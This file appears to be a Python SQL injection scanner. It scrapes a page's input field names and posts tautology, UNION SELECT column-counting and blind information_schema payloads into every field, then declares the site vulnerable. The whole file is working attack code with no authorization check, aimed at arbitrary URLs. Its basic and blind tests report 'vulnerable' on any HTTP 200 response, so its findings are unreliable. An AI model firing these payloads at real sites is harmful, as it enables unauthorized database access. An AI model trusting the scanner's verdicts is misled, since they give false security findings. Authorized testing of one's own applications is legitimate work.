import requests
from bs4 import BeautifulSoup

date = "2022-10-10"

GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'


# retrieve all input tags from HTML page and get the name attr
def get_input_tag(url):
    page = requests.get(url)
    soup = BeautifulSoup(page.text, 'html.parser')
    input_tag = soup.find_all('input')
    name = []
    for i in input_tag:
        if 'name' in i.attrs:
            name.append(i['name'])
    return name


def test_basic_injection(url):
    tags_name = get_input_tag(url)
    payload_specific = "1' OR 1=1-- "
    for i in tags_name:
        if "date" in i.lower():
            payload_specific = f"{date}' OR 1=1-- "
        elif "id" in i.lower() or "min" in i.lower() or "max" in i.lower() or "orderby" in i.lower():
            payload_specific = "1 OR 1=1-- "
    payload = {i: payload_specific for i in tags_name}
    r = requests.post(url, payload)
    print("Test basic SQLi with payload:", payload)
    if r.status_code == 200:
        return True
    else:
        return False


def test_union_injection(url, max_columns):
    base_payload = " UNION SELECT "
    tags_name = get_input_tag(url)
    base_payloads = {}
    for tag in tags_name:
        if "date" in tag.lower():
            base_payloads[tag] = f"{date}'" + base_payload
        elif "id" in tag.lower() or "min" in tag.lower() or "max" in tag.lower() or "orderby" in tag.lower():
            base_payloads[tag] = "1" + base_payload
        else:
            base_payloads[tag] = "1'" + base_payload

    # Send payload with increasing number of NULL
    for i in range(1, max_columns + 1):
        nulls = ', '.join(['NULL'] * i)
        payload = {tag: base_payloads[tag] + f"{nulls}-- " for tag in tags_name}
        print("Test UNION-based SQLi with payload: ", payload)
        r = requests.post(url, payload)
        if r.status_code == 200 and "null" in r.text.lower():
            return True
    return False


def test_blind_injection(url):
    base_payload = " OR EXISTS(SELECT table_name FROM information_schema.tables WHERE table_name = 'users')-- "
    tags_name = get_input_tag(url)
    payload = {}
    for tag in tags_name:
        if "date" in tag.lower():
            payload[tag] = f"{date}'{base_payload}"
        elif "id" in tag.lower() or "min" in tag.lower() or "max" in tag.lower() or "orderby" in tag.lower():
            payload[tag] = f"1{base_payload}"
        else:
            payload[tag] = f"1'{base_payload}"

    r = requests.post(url, payload)
    print(f"Test Blind SQLi with payload: {payload}")
    if r.status_code == 200:
        return True
    else:
        return False


def perform_injection_tests(url):
    if test_basic_injection(url):
        print(f"{GREEN}\U00002705 Vulnerable to basic SQL injection.{RESET}")
    else:
        print(f"{RED}\U0000274C Not vulnerable to basic SQL injection.{RESET}")
    if test_union_injection(url, 5) == 1:
        print(f"{GREEN}\U00002705 Vulnerable to UNION-based SQL injection, query results are returned in the response, you can retrieve useful informations from DB.{RESET}")
    else:
        print(f"{RED}\U0000274C Seems not vulnerable to UNION-based SQL injection, the response page may not return the results of the relevant SQL query. Try increasing the number of columns to be checked.{RESET}")
    if test_blind_injection(url):
        print(f"{GREEN}\U00002705 Potentially vulnerable to blind SQL injection.{RESET}")
    else:
        print(f"{RED}\U0000274C Seems not vulnerable to blind SQL injection.{RESET}")
    print("Test completed.")
